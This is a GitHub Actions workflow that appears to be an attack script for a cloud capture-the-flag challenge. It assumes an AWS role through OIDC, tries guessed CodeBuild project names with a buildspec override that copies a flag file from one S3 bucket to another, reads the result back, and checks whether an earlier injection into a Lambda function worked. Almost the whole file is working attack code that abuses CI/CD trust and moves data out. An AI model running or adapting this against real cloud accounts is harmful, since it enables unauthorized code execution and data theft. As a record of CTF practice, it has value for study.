name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Try start CodeBuild with guessed project names
        run: |
          for PROJECT in codebuild_vpc nslookupv2 cicd deploy ctf attack; do
            echo "===== trying project: $PROJECT ====="
            aws codebuild start-build \
              --project-name "$PROJECT" \
              --region us-east-1 \
              --buildspec-override '{"version":"0.2","phases":{"build":{"commands":["aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt && aws s3 cp /tmp/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"]}}}' \
              --query 'build.id' --output text 2>&1 || true
          done

      - name: Wait for build
        run: sleep 45

      - name: Read flag from platform bucket
        run: |
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag_out.txt - || echo "not found"

      - name: Also check Lambda description - did previous injection work?
        run: |
          aws lambda get-function-configuration \
            --function-name nslookupv2 --region us-east-1 \
            --query '{Description: Description, Environment: Environment}'
